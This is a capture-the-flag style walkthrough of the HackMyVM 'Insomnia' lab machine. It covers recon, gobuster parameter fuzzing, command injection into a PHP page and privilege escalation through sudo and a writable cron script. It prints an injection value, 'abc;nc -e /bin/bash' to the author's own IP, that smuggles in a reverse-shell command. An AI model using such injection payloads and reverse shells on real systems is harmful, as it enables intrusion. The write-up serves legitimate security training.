+++
title = "Insomnia"
date = 2024-02-07T19:41:10-06:00
summary="Another machine by sml"
draft=false
tags=["pentesting","hackmyvm","easy","RCE","php","fuzzing"]
series=["Hackmyvm Easy"]
series_order=5
+++
## Foreword
Just started classes again, so the page might be updated less often, in the machines section at least. Once again, thanks for your time if you're reading this. :)
## Machine info
| Name       | Insomnia                                                         | 
| ---------- | ---------------------------------------------------------------- |
| Author     | alienum                                                                 |
| Site       | [hackmyvm](https://hackmyvm.eu/machines/machine.php?vm=Insomnia) |
| Difficulty | Easy                                                                 |

## Recon

We run our NMAP scan:

![](imagenes/Pasted%20image%2020240207195749.png)

**Note: Power went out when I was trying to solve this machine, and had to re-add it to virtual box in order to work properly again, so, instead of .24 at the end of the IP address, you'll now see .25**

Lets check the webpage:

![](imagenes/Pasted%20image%2020240207201941.png)

A chat webpage, lets check its source:

![](imagenes/Pasted%20image%2020240207202031.png)

Here we have the script in *javascript* that runs the chat session, we may be able to use *XSS* in this machine, but beforehand, lets try enumerating the webpage.

![](imagenes/Pasted%20image%2020240207202806.png)

Interesting, lets check each one of these files on the webpage:

### chat.txt

![](imagenes/Pasted%20image%2020240207202846.png)

A log of the chat, lets keep checking.

### administration.php

![](imagenes/Pasted%20image%2020240207203031.png)

Apparently, we can **call** a file here, but, we don't know the variable name that the php script is using, so, we're going to do some fuzzing with gobuster, and find out the correct variable name with this command: `gobuster fuzz -u http://192.168.25.25:8080/administration.php?FUZZ=prueba -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 65
`
![](imagenes/Pasted%20image%2020240207203709.png)

Nice, we found the variable name, lets check the webpage:

![](imagenes/Pasted%20image%2020240207203848.png)

That's good, here we can see the message we typed earlier, lets try and see if we can execute some commands.

![](imagenes/Pasted%20image%2020240207204758.png)

We don't know specifically what the php script does, we can suppose it uses `cat <file>` with function `system("cmd")` or something like that. Now, lets try the following command to see if we can get a reverse shell: `abc;nc -e /bin/bash 192.168.25.5 4444`

## Initial access

![](imagenes/Pasted%20image%2020240207205056.png)

There we go, first things first, lets get a full tty:

![](imagenes/Pasted%20image%2020240207205301.png)

We find the user flag, now lets see how we can switch to another user, or escalate privileges:

![](imagenes/Pasted%20image%2020240207205430.png)

Interesting, lets see that the script does:

![](imagenes/Pasted%20image%2020240207205615.png)

Checking the help page:

![](imagenes/Pasted%20image%2020240207205629.png)

This php command starts the webserver in port 8080, but, it does it via the `bash terminal`, so, maybe we can replace the contents and just execute a bash shell, with the privileges of the user `julia`.

***
### Note: Troubleshooting
At this point, I couldn't edit the file with `echo`, I got the following error `bash: echo: write error: No space left on device`, so, in order to fix that, I had to *resize the machine virtual disk* so it could work again, please do note, that if you do this after you run the machine once, it might break it,in my case, it just wouldn't show me the webpage, so you'll have to import the machine again, so, if you're following this walkthrough, **I recommend resizing this machine's disk beforehand. Now, lets keep going**.
***
![](imagenes/Pasted%20image%2020240207212415.png)

Good, lets check the script again:

![](imagenes/Pasted%20image%2020240207212447.png)

Now, lets try to run it as `julia` using `sudo -u julia /bin/bash /var/www/html/start.sh`:

## Privilege Escalation

![](imagenes/Pasted%20image%2020240207212742.png)

We're in as `julia`, lets see what we can do:

![](imagenes/Pasted%20image%2020240207212912.png)

We find this interesting script in `/etc/crontab`, lets check what it does:

![](imagenes/Pasted%20image%2020240207213059.png)

It seems all it does it check if some service is active, and if it isn't running, it starts it. Lets check the privileges of this file:

![](imagenes/Pasted%20image%2020240207213159.png)

Jackpot, lets edit this file with a payload, so it sends a root session to our machine:

![](imagenes/Pasted%20image%2020240207213436.png)

![](imagenes/Pasted%20image%2020240207213614.png)

As we enter this command, we get this in our listener:

![](imagenes/Pasted%20image%2020240207213651.png)

We get root, lets get that flag, and finish this machine:

![](imagenes/Pasted%20image%2020240207213853.png)

Thanks your time and good luck in future machines!

## Things I learned from this machine
- When encountering `php` file, try fuzzing for variables, they may call for certain files using the php script, allowing us to make use of **remote command execution** for initial access.
- Resize virtual machines virtual disk if I find `bash: echo: write error: No space left on device` again.

